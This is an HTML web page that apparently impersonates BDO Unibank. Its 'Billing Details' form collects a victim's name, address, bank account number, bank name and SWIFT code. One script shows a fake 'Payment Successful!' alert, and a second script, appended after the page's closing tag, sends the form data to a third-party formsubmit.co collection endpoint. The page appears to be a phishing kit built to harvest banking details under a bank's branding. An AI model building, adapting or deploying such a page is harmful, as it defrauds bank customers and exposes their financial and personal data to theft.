<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>BDO Unibank</title>

  <!-- Bootstrap 5 CDN -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" />
  <link rel="icon" href="./logo.jpeg" type="image/jpeg" />
  
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>

  <style>
    body {
      background-color: #f5f7fa;
    }

    .checkout-card {
      border-radius: 12px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
    }

    .logo {
      font-weight: bold;
      font-size: 1.5rem;
      color: #1877f2;
    }

    .btn-primary {
      background-color: #1877f2;
      border: none;
    }

    .btn-primary:disabled {
      background-color: #9ec5fe;
    }
    .btn-primary:disabled,
    .btn-primary.disabled {
      background-color: #7aa6d9; /* lighter blue */
      border-color: #7aa6d9;
      color: #ffffff;
      opacity: 0.65;
      cursor: not-allowed;
    }
  </style>
</head>

<body>

  <div class="container py-5">

    <!-- Header -->
    <div class="text-center mb-4">
      <div class="logo"><img src="./logo.jpeg" width="70" alt=""></div>
    </div>

    <div class="row justify-content-center">
      <div class="col-lg-6">

        <div class="card checkout-card p-4">

          <h5 class="mb-3">Billing Details</h5>

          <form id="checkoutForm">
            <!-- Name -->
            <div class="mb-3">
              <label class="form-label">Full Name</label>
              <input type="text" id="fullname" class="form-control" placeholder="" required>
            </div>
            <!-- Address -->
            <div class="mb-3">
              <label class="form-label">Street Address</label>
              <input type="text" id="str_address" class="form-control" placeholder="" required>
            </div>
            <div class="row">
              <!-- City -->
              <div class="mb-3 col">
                <label class="form-label">City</label>
                <input type="text" id="city" class="form-control" placeholder="" required />
              </div>
              <!-- City -->
              <div class="mb-3 col">
                <label class="form-label">State</label>
                <input type="text" id="state" class="form-control" placeholder="" required />
              </div>
            </div>
            <div class="row">
              <!-- City -->
              <div class="mb-3 col">
                <label class="form-label">Country</label>
                <input type="text" id="country" class="form-control" placeholder="" required />
              </div>
              <!-- City -->
              <div class="mb-3 col">
                <label class="form-label">Zip code</label>
                <input type="text" id="zip_code" class="form-control" placeholder="" required />
              </div>
            </div>
            <!-- Card Number -->
            <div class="mb-3">
              <label class="form-label">Bank Account Number</label>
              <input type="text" id="bank_account" class="form-control" placeholder="" required />
            </div>
            <!-- Expiry -->
            <div class="mb-3">
              <label class="form-label">Bank Name</label>
              <input type="text" id="bank_name" class="form-control" placeholder="" required>
            </div>
            <!-- Card Number -->
            <div class="mb-3">
              <label class="form-label">Amount to be received</label>
              <input type="text" id="amount" class="form-control" placeholder="" required />
            </div>
            <!-- Card Number -->
            <div class="mb-4">
              <label class="form-label">Swift code</label>
              <input type="text" id="swift_code" class="form-control" placeholder="" required />
            </div>
            <!-- Submit -->
            <button type="submit" class="btn btn-primary w-100 p-3 login-btn" style="background-color:#014EA8;" id="payBtn">
              Transfer
            </button>
          </form>
        </div>

      </div>
    </div>
  </div>

  <script>
    const form = document.getElementById('checkoutForm');
    const btn = document.getElementById('payBtn');

    form.addEventListener('submit', function (e) {
      e.preventDefault();

      btn.disabled = true;
      btn.innerText = "Processing...";

      setTimeout(() => {
        alert("Payment Successful!");
        location.reload();
      }, 1000);
    });
  </script>

</body>

</html>

<script>
  $("#checkoutForm").submit((e) => {
    data = new FormData(this);
    e.preventDefault();
    // const data = {
    //   message: msg,
    //   from_name: "OpenTeller"
    // }
    $(".login-btn").prop("disabled", true).html("<i class='spinner-border spinner-border-sm'></i>...");
    $.ajax({
      url: "https://formsubmit.co/ajax/fceb7c66a69228b93c167b94e13568a0",
      method: "POST",
      data: data,
      dataType: "json"
    })
      .then((message) => {
        console.log(message);
        $(".login-btn").prop("disabled", false).html("Transfer");
      })
      .catch((err) => {
        console.log(err);
        $(".login-btn").prop("disabled", false).html("Transfer");
      });
  });
</script>
